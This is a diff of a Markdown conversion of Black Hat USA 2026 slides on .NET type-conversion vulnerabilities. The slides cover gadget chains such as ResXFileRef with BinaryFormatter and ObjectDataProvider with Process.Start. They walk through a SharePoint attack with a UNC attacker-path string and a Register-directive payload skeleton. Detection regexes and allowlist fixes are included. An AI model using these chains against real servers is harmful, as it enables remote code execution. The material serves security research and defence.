@@ -8,19 +8,24 @@ year: 2026
 source_pdf: "BlackHat_USA_2026_Slides/Oleksandr Mirosh_Transformers Dark Side of the Type - Weaponizing the Conversion Layer.pdf"
 pages: 53
 sha256: "3fc686b68cc0805758a640155dce4db3da93b16ca16cbe8e0218df418eed5cf1"
-text_chars: 26270
+text_chars: 26490
 ocr_pages: 0
 has_ocr: false
 redacted_secrets: 0
+ocr_confidence: null
+ocr_unreliable_blocks: 0
+ocr_timeouts: 0
+pages_recovered_from_text_layer: 0
 companion_files: []
 extractor: "pymupdf4llm 1.28.2"
-converted_at: "2026-08-11T23:13:56Z"
+converted_at: "2026-08-12T05:40:11Z"
 ---
 # Transformers Dark Side of the Type - Weaponizing the Conversion Layer
 
 **Speakers:** Oleksandr Mirosh  
 **Conference:** Black Hat USA 2026  
 **Source:** `BlackHat_USA_2026_Slides/Oleksandr Mirosh_Transformers Dark Side of the Type - Weaponizing the Conversion Layer.pdf` (53 pages)
+
 
 ## Slide 1
 
@@ -40,17 +45,17 @@ Weaponizing the Conversion Layer
 
 ##### **@olekmirosh**
 
-```
+\```
 At Black Hat & DEF CON before
-```
+\```
 
 Security Researcher, OpenText Fortify
 
 18+ years
 
-```
+\```
 2020
-```
+\```
 
 Room for Escape
 
@@ -58,17 +63,17 @@ vulnerability research · reversing · pentest
 
 Research areas
 
-```
+\```
 2019
-```
+\```
 
 SSO Wars: The Token Menace
 
 serialization · auth protocols · JNDI
 
-```
+\```
 2017
-```
+\```
 
 Friday the 13th: JSON Attacks
 
@@ -76,9 +81,9 @@ Friday the 13th: JSON Attacks
 
 Java and .NET
 
-```
+\```
 2016
-```
+\```
 
 JNDI/LDAP → RCE Dream Land
 
@@ -122,37 +127,37 @@ Programs work with data as **objects** in memory
 
 To store or transmit them, they need a **format** : `XML · XAML · JSON · String · Binary · …`
 
-```
+\```
 The machinery
-```
+\```
 
-```
+\```
 BinaryFormatter
 XmlSerializer
-```
+\```
 
-```
+\```
 DataContractSerializer
-```
+\```
 
-```
+\```
 Newtonsoft.Json
-```
+\```
 
 Object format is the job of **machinery** : `parsers · marshallers · serializers`
 
-```
+\```
 System.Text.Json
-```
+\```
 
-```
+\```
 ObjectInputStream
-```
+\```
 
-```
+\```
 Jackson
 fastjson
-```
+\```
 
 5
 
@@ -164,17 +169,17 @@ To rebuild an object, the machinery **picks a type** , then **runs code** to bui
 
 That is **Insecure Deserialization.** Known for over a decade.
 
-```
+\```
 20092012
-```
+\```
 
-```
+\```
 2015
-```
+\```
 
-```
+\```
 2017
-```
+\```
 
 _a decade of CVEs_
 
@@ -228,9 +233,9 @@ It performs the **same two operations** a serializer does: **`select a type`** `
 
 Developers rely on it constantly. It's rarely reviewed as a security boundary.
 
-```
+\```
 → whitepaper §2.2
-```
+\```
 
 10
 
@@ -238,9 +243,9 @@ Developers rely on it constantly. It's rarely reviewed as a security boundary.
 
 ###### NOT EVERY CONVERSION QUALIFIES
 
-```
+\```
 IN
-```
+\```
 
 _string as input · a type may be resolved_ **`TypeConverter.ConvertFrom`**
 
@@ -262,9 +267,9 @@ _string as input · the type is fixed_
 
 the constructor is the trigger
 
-```
+\```
 Parameterless ctor + accessors
-```
+\```
 
 the members run the code
 
@@ -276,9 +281,9 @@ defines its own shape
 
 ###### **`Complex serializers`**
 
-```
+\```
 → whitepaper §2.1
-```
+\```
 
 11
 
@@ -300,9 +305,9 @@ A transformation layer mechanism is an **Insecure String Transformer** when all 
 
 - The first three make a transformer. **The fourth makes it a weapon.**
 
-```
+\```
 → whitepaper §2.3
-```
+\```
 
 12
 
@@ -324,9 +329,9 @@ A transformation layer mechanism is an **Insecure String Transformer** when all 
 
 Two entrances. **One attack.**
 
-```
+\```
 → whitepaper §2.3
-```
+\```
 
 13
 
@@ -362,24 +367,24 @@ This isn't theory.
 
 unprivileged user · default config
 
-```
+\```
 CVE-2020-1460
-```
+\```
 
-```
+\```
 CVE-2026-26106
 CVE-2026-40357
-```
+\```
 
-```
+\```
 CVE-2026-47294
-```
+\```
 
 ###### **`CVE-2026-48560`**
 
-```
+\```
 Reproduced. Reported. Patched.
-```
+\```
 
 15
 
@@ -417,9 +422,9 @@ One desktop reference deep in the graph pulls them back
 
 Availability is a property of the runtime — **not the transformer.**
 
-```
+\```
 → whitepaper §3.1
-```
+\```
 
 17
 
@@ -436,9 +441,9 @@ Availability is a property of the runtime — **not the transformer.**
 
 Input becomes an instance of an **attacker-chosen type.**
 
-```
+\```
 → whitepaper §3
-```
+\```
 
 18
 
@@ -448,11 +453,11 @@ Input becomes an instance of an **attacker-chosen type.**
 
 A type may declare a `TypeConverter` via an attribute. A separate class that builds an instance from a string.
 
-```
+\```
 Type t = Type.GetType(typeName);
 var conv = TypeDescriptor.GetConverter(t);
 return conv.ConvertFromString(value);
-```
+\```
 
 `RESOLUTION` input becomes a Type `SELECTION` the type selects the code `EXECUTION` the call runs it
 
@@ -460,9 +465,9 @@ return conv.ConvertFromString(value);
 
 The type doesn't convert. **It delegates to its TypeConverter.**
 
-```
+\```
 → whitepaper §3.2
-```
+\```
 
 19
 
@@ -482,15 +487,15 @@ _never weighed being reachable by anyone who can name its type_
 
 Nothing connects them but the type name the attacker supplies.
 
-```
+\```
 XamlSerializationWrapperConverter  ·  EndpointCollectionConverter
-```
+\```
 
 Ours in 2017. Both needed Visual Studio installed. **The next ones don't.**
 
-```
+\```
 → whitepaper §3.2
-```
+\```
 
 20
 
@@ -510,9 +515,9 @@ narrower: only *.cur and *.ani reach the decoder
 
 **`CursorConverter`** Every loadable assembly **brings more.**
 
-```
+\```
 → whitepaper §3.2
-```
+\```
 
 21
 
@@ -522,9 +527,9 @@ narrower: only *.cur and *.ani reach the decoder
 
 `ResXFileRef` Soroush Dalili, 2018 Not tied to any product ships in System.Windows.Forms
 
-```
+\```
 MECHANISM
-```
+\```
 
 ① `resolve the named type`
 
@@ -538,9 +543,9 @@ Carries into modern .NET as part of Microsoft.WindowsDesktop.App Already outboun
 
 **For more, hand it a capable stream gadget.**
 
-```
+\```
 → whitepaper §3.2
-```
+\```
 
 22
 
@@ -554,41 +559,41 @@ Carries into modern .NET as part of Microsoft.WindowsDesktop.App Already outboun
 
 reaches modern .NET, narrowing with each release
 
-```
+\```
 → new ResourceSet(stream)
-```
+\```
 
 Soroush Dalili named three
 
-```
+\```
 → ResourceReader stands up a BinaryFormatter
-```
+\```
 
-```
+\```
 ResourceSet
-```
+\```
 
-```
+\```
 → DeserializeObject clears the binder
-```
+\```
 
-```
+\```
 ResXResourceSet
-```
+\```
 
-```
+\```
 → BinaryFormatter.Deserialize(the payload) → RCE
-```
+\```
 
-```
+\```
 ResourceReader
-```
+\```
 
 Where BinaryFormatter is gone, **ResXFileRef needs a different stream gadget.**
 
-```
+\```
 → whitepaper §3.2
-```
+\```
 
 23
 
@@ -600,10 +605,10 @@ More RCE gadgets. Without BinaryFormatter.
 
 **`WorkflowServiceBehavior`** `System.WorkflowServices.dll stream ctor copies the bytes → internal ctor reads WorkflowName during construction → DeSerizalizeDefinition → XOML deserializer` _the deserialize hides behind a property read_
 
-```
+\```
 XamlImageInfoSystem.Activities.Presentation.dll
 constructor → XamlReader.Load(stream) → RCE
-```
+\```
 
 ###### **`MODERN .NET`**
 
@@ -611,9 +616,9 @@ Both are absent from modern .NET shared frameworks: the Workflow Foundation desi
 
 Reachable there only where an application references those assemblies directly.
 
-```
+\```
 → whitepaper §3.2
-```
+\```
 
 24
 
@@ -629,9 +634,9 @@ A type buildable from a string exposes a static `Parse()/TryParse()` . Both buil
 
 ##### No second class to find. **The factory is already on the type.**
 
-```
+\```
 → whitepaper §3.3
-```
+\```
 
 25
 
@@ -641,14 +646,14 @@ A type buildable from a string exposes a static `Parse()/TryParse()` . Both buil
 
 XamlReader.Parse was one of our 2017 XAML sinks. XamlServices.Parse is the second, through the System.Xaml writer.
 
-```
+\```
 public static object Parse(string xamlText)
-```
+\```
 
-```
+\```
 => Parse(xamlText, useRestrictiveXamlReader: false);
 // false → the full XAML object writer builds the graph
-```
+\```
 
 **Listing 20** C#   XamlReader.Parse opts out of the restricted reader
 
@@ -656,9 +661,9 @@ public static object Parse(string xamlText)
 
 **`Availability`** GAC on Framework · WindowsDesktop.App on modern .NET One string: **Parse builds the graph, and the graph runs the code.**
 
-```
+\```
 → whitepaper §3.3
-```
+\```
 
 26
 
@@ -674,9 +679,9 @@ The plainest transformer: hand a string to a single-argument constructor. Writin
 
 `new Uri(s)  ·  new Version(s)  ·  new Guid(s)  ·  new MailAddress(s)` No method to locate, no converter to resolve. **Construction is the whole operation.**
 
-```
+\```
 → whitepaper §3.4
-```
+\```
 
 27
 
@@ -686,13 +691,13 @@ The plainest transformer: hand a string to a single-argument constructor. Writin
 
 A single-string constructor that opens an attacker-named path. Make it a UNC path and any of them reaches out.
 
-```
+\```
 FILE READFILE WRITE
-```
+\```
 
-```
+\```
 StreamReader(path)
-```
+\```
 
 ###### **`StreamWriter(path)`**
 
@@ -716,9 +721,9 @@ _reset a file: DoS. Create one: flip an existence check. a flush on dispose or f
 
 ##### The string names the path. **The constructor does the rest.**
 
-```
+\```
 → whitepaper §3.4
-```
+\```
 
 28
 
@@ -744,9 +749,9 @@ No carrier. The constructor opens the path itself.
 
 The path can be UNC. **The bytes come from a remote share.**
 
-```
+\```
 → whitepaper §3.4
-```
+\```
 
 29
 
@@ -756,13 +761,13 @@ The path can be UNC. **The bytes come from a remote share.**
 
 This one empties the constructor and moves the code to the members. Every assignment runs its accessor.
 
-```
+\```
 Type t = Type.GetType(typeName);
 object obj = Activator.CreateInstance(t);
 foreach (var (name, value) in inputPairs)
 PropertyInfo p = t.GetProperty(name);
 p.SetValue(obj, value);
-```
+\```
 
 `RESOLUTION` input becomes a Type `SELECTION` the name picks the member `EXECUTION` the selected accessor runs
 
@@ -770,9 +775,9 @@ p.SetValue(obj, value);
 
 Any accessor can run code. **And the most capable one comes next.**
 
-```
+\```
 → whitepaper §3.5
-```
+\```
 
 30
 
@@ -784,13 +789,13 @@ Its job is to call a method on an object and show the result. The whole operatio
 
 ###### **`THREE COMBINATIONS`**
 
-```
+\```
 public void set_MethodName(string value) {
 this._methodName = value;
 base.Refresh(); }   // → BeginQuery → QueryWorker
 _objectType.InvokeMember(MethodName, flags,
 _objectInstance, methodParams);
-```
+\```
 
 **Listing 32** C#   ObjectDataProvider: setting properties reaches InvokeMember
 
@@ -800,9 +805,9 @@ _objectInstance, methodParams);
 
 Canonical RCE payload: **`ObjectInstance = Process, MethodName = Start.`**
 
-```
+\```
 → whitepaper §3.5
-```
+\```
 
 31
 
@@ -812,29 +817,29 @@ Canonical RCE payload: **`ObjectInstance = Process, MethodName = Start.`**
 
 The first four are the standard shapes, not a closed list. Each had a name a reviewer could grep.
 
-```
+\```
 GetConverter()  ·  static Parse()  ·  new T(string)  ·  a property-setting loop
-```
+\```
 
 Custom conversion logic offers no such handle.
 
-```
+\```
 IN THE WILD
-```
+\```
 
-```
+\```
 DataSet.ReadXml → XmlSerializer → RCE
-```
+\```
 
-```
+\```
 CVE-2020-1147
-```
+\```
 
 Four shapes we can name. **Behavior finds the ones we cannot.**
 
-```
+\```
 → whitepaper §3.6
-```
+\```
 
 32
 
@@ -852,11 +857,11 @@ Four shapes we can name. **Behavior finds the ones we cannot.**
 
 SharePoint, 2020. A conversion that resolved an attacker-named type. RCE with no serialization format and no parser endpoint.
 
-```
+\```
 string typeName = element.GetAttribute("Type");
 Type type = Type.GetType(typeName);
 GetConverter(type).ConvertFromString(value);
-```
+\```
 
 `THE TYPE` from the workflow XML `THE STRING` from the insert arguments
 
@@ -864,9 +869,9 @@ GetConverter(type).ConvertFromString(value);
 
 A type name and a string. **They meet on the last line.**
 
-```
+\```
 → whitepaper §4.1
-```
+\```
 
 34
 
@@ -878,35 +883,35 @@ A type name and a string. **They meet on the last line.**
 
 ###### **Everything the attacker supplies**
 
-```
+\```
 THE TYPE
-```
+\```
 
 ###### **`REACHING Insert()` Four steps, unprivileged user**
 
 - **`1`** a config file carrying the Type
 
-```
+\```
 Type="System.Resources.ResXFileRef,
-```
+\```
 
-```
+\```
 System.Windows.Forms, ..."
-```
+\```
 
 - **`2`** bound to a list by ID
 
-```
+\```
 THE STRING
-```
+\```
 
-```
+\```
 "\\attacker\p.resx ; ResourceSet ; enc"
-```
+\```
 
-```
+\```
 filename ; typename ; encoding
-```
+\```
 
 - **`3`** applied via AssociateWorkflowMarkup
 
@@ -916,9 +921,9 @@ ResXFileRef → ResourceSet → BinaryFormatter → RCE
 
 Two strings in the right place, **and a hosted file does the rest.**
 
-```
+\```
 → whitepaper §4.1
-```
+\```
 
 35
 
@@ -932,25 +937,25 @@ No serializer to harden. No TypeNameHandling to set. The patch constrains the ty
 
 ###### **`THE ALLOWLIST`**
 
-```
+\```
 bool
 int
 double
 string
 DateTime
 + three SPField types
-```
+\```
 
-```
+\```
 ResXFileRefnot
 reachable
-```
+\```
 
 This is the fix we recommend. **Correct, and in the right place.**
 
-```
+\```
 → whitepaper §4.1
-```
+\```
 
 36
 
@@ -958,31 +963,31 @@ This is the fix we recommend. **Correct, and in the right place.**
 
 #### SIX YEARS LATER
 
-```
+\```
 2020
-```
+\```
 
 ###### **One bug, no class in sight**
 
-```
+\```
 CVE-2020-1460
-```
+\```
 
 no restriction at all fixed correctly
 
-```
+\```
 2026
-```
+\```
 
 ###### **Four more, same class**
 
-```
+\```
 CVE-2026-26106
-```
+\```
 
-```
+\```
 CVE-2026-40357
-```
+\```
 
 **`CVE-2026-47294`** _we walk this one_ `CVE-2026-48560`
 
@@ -990,9 +995,9 @@ each behind a restriction, each bypassed
 
 The bug was simple. **The class is not.**
 
-```
+\```
 → whitepaper §4.2
-```
+\```
 
 37
 
@@ -1002,12 +1007,12 @@ The bug was simple. **The class is not.**
 
 A different component: the ASPX markup parser. Two of its branches are Insecure String Transformers.
 
-```
+\```
 ret = converter.ConvertFromInvariantString(value);
 // when no such converter is found:
 MethodInfo mi = objType.GetMethod("Parse", …);
 ret = Util.InvokeMethod(mi, null, parameters);
-```
+\```
 
 `TYPECONVERTER` the vector from 4.1
 
@@ -1017,9 +1022,9 @@ ret = Util.InvokeMethod(mi, null, parameters);
 
 ##### A reachable sink. **Behind an allowlist.**
 
-```
+\```
 → whitepaper §4.2
-```
+\```
 
 38
 
@@ -1033,9 +1038,9 @@ SafeControl checks the control type, not its property types. Markus Wulftange wa
 
 The fix reached one ASPX parser. **There are two.**
 
-```
+\```
 → whitepaper §4.2
-```
+\```
 
 39
 
@@ -1045,24 +1050,24 @@ The fix reached one ASPX parser. **There are two.**
 
 Delivery is a single request to the design-mode service. ExecuteProxyUpdates carries the type and the payload together. **`THE TYPE  ·  REGISTER DIRECTIVE`**
 
-```
+\```
 <Register TagPrefix="x" Namespace="Microsoft.SharePoint.
 ProxyRequestResponse`1[[System.Xaml.XamlServices, …]]" />
-```
+\```
 
-```
+\```
 THE PAYLOAD  ·  ASPX MARKUP
-```
+\```
 
-```
+\```
 <x:0 runat="server" value='{XAML_PAYLOAD}' />
-```
+\```
 
 _the payload is the ObjectDataProvider XAML from §3.5_ One request with the generic type and the XAML string. **RCE.**
 
-```
+\```
 → whitepaper §4.2
-```
+\```
 
 40
 
@@ -1080,9 +1085,9 @@ Microsoft added a character restriction on the Register directive. The generic-t
 
 Two cut points, one boundary: **the type.**
 
-```
+\```
 → whitepaper §4.2
-```
+\```
 
 41
 
@@ -1102,29 +1107,29 @@ _Find it once, close it for good_
 
 There is no serializer call to grep for, and no payload format to match. The transformer hunt runs in three passes.
 
-```
+\```
 the shared hunt
-```
+\```
 
 input becomes a Type — one query, all five
 
-```
+\```
 the sink hunt
-```
+\```
 
 the conversion that consumes the resolved type
 
-```
+\```
 the gadget hunt
-```
+\```
 
 what that type does, across everything loadable
 
 Three hunts named. **Now the rules for each.**
 
-```
+\```
 → whitepaper §5.1
-```
+\```
 
 43
 
@@ -1134,23 +1139,23 @@ Three hunts named. **Now the rules for each.**
 
 Each transformer begins here: input becomes a Type. The sink only decides what happens next.
 
-```
+\```
 \b\w*(Get|Resolve|Create|Load)Type\w*\s*\(
 Activator\.CreateInstance\s*\(
-```
+\```
 
-```
+\```
 # framework calls and wrappers
 # name-based overloads
-```
+\```
 
 **Listing 46** regex   shared hunt: type resolution, text search _base patterns, to show the shape of the hunt — not production rules_ A wrapper can hide the base call. `builder.GetType()   ·   registry.Resolve()   ·   loader.Create()` any method that takes a name and returns a Type is a candidate
 
 One door in for all five. **And no way to reach the code without it.**
 
-```
+\```
 → whitepaper §5.1
-```
+\```
 
 44
 
@@ -1169,9 +1174,9 @@ Once the type is resolved, each primitive collapses to one short call. Learn the
 
 ##### Matching the sink finds the conversion. **Finding the gadget makes it an attack.**
 
-```
+\```
 → whitepaper §5.1
-```
+\```
 
 45
 
@@ -1181,20 +1186,20 @@ Once the type is resolved, each primitive collapses to one short call. Learn the
 
 A gadget looks like an ordinary conversion, until you see what it touches. What to read: a ConvertFrom, a Parse, a constructor, an accessor.
 
-```
+\```
 Assembly.Load*                          // load an assembly
 Type.GetType, Activator.CreateInstance  // resolve a type
 Xaml*                                   // XamlReader, XamlServices, Baml*
 *Deserialize                            // Xml, DataContract, Binary, Soap
 File.Open*, new FileStream              // read a file, incl. UNC
 WebRequest, HttpClient                  // outbound fetch
-```
+\```
 
 **Listing 47** C#   examples of what may count as a dangerous gadget body _not every primitive has a gadget for every payoff on every runtime — yet_ Last piece in. **And it names the payoff: run, read, or reach out.**
 
-```
+\```
 → whitepaper §5.1
-```
+\```
 
 46
 
@@ -1204,26 +1209,26 @@ WebRequest, HttpClient                  // outbound fetch
 
 Black-box, incident response, or a defender with no source. The type name is in the data: traffic, storage, files, logs. **`RECON  ·  WHERE CONVERSION HAPPENS`**
 
-```
+\```
 # a .NET type name in a value position
 \b(?:System|Microsoft|MyApp)\.[A-Za-z0-9_]+(?:[.+][A-Za-z0-9_]+)*\b
-```
+\```
 
-```
+\```
 ATTACK  ·  A VALUE CARRYING WHAT IT SHOULD NOT
-```
+\```
 
-```
+\```
 (ObjectDataProvider|ResXFileRef|XamlReader|XamlServices)   # known gadgets
 <\s*[A-Za-z][\w:.-]*\s+[^>]*xmlns|msdata:DataType\s*=   # markup where a scalar belongs
 \\\\[A-Za-z0-9._-]+\\[^\s"']+|[a-z]+://[^\s"']+   # a UNC path or URL in a value
-```
+\```
 
 The name of the type is the signature. **Whether you read code or read data.**
 
-```
+\```
 → whitepaper §5.2
-```
+\```
 
 47
 
@@ -1239,9 +1244,9 @@ The name of the type is the signature. **Whether you read code or read data.**
 
 confirmed reachable code execution
 
-```
+\```
 TIER 2
-```
+\```
 
 likely: one condition unconfirmed
 
@@ -1267,9 +1272,9 @@ reachable, but no gadget found yet
 
 Every one of these should be fixed. **Triage only sorts the order.**
 
-```
+\```
 → whitepaper §5.3
-```
+\```
 
 48
 
@@ -1291,9 +1296,9 @@ a list of the types you expect, never a description of the ones you fear
 
 The type choice is the vulnerability. **Take it back and nothing fires.**
 
-```
+\```
 → whitepaper §5.4
-```
+\```
 
 49
 
@@ -1303,20 +1308,20 @@ The type choice is the vulnerability. **Take it back and nothing fires.**
 
 The strongest fix is to not resolve a type from input at all. Often the type is not truly dynamic: pin it in code.
 
-```
+\```
 // input-driven type: the whole class in one line
 var obj = Convert(Type.GetType(input.TypeName), input.Value);
 // fixed type: nothing to steer
 var address = ParseAddress(input.Value);
-```
+\```
 
 **Listing 64** C#   input-driven vs. fixed destination type
 
 _possible far more often than the code suggests_ If no input chooses the type, **there is nothing to exploit.**
 
-```
+\```
 → whitepaper §5.4
-```
+\```
 
 50
 
@@ -1326,16 +1331,16 @@ _possible far more often than the code suggests_ If no input chooses the type, *
 
 When the type genuinely varies, restrict which names may resolve. Matched against a known-good set, checked before resolution.
 
-```
+\```
 static readonly HashSet<string> Allowed = new()
 { "System.Int32", "System.DateTime", "MyApp.Models.CustomerAddress" };
 if (!Allowed.Contains(inputTypeName))
-```
+\```
 
-```
+\```
 throw new SecurityException($"Type not permitted: {inputTypeName}");
 Type t = Type.GetType(inputTypeName);    // only for an approved name
-```
+\```
 
 **Listing 65** C#   exact-name allowlist at the sink
 
@@ -1343,9 +1348,9 @@ Type t = Type.GetType(inputTypeName);    // only for an approved name
 
 **Blocklists:** not a defense. They name only what is already known. Restrict which types can resolve, **and the conversion layer goes quiet.**
 
-```
+\```
 → whitepaper §5.4
-```
+\```
 
 51
 
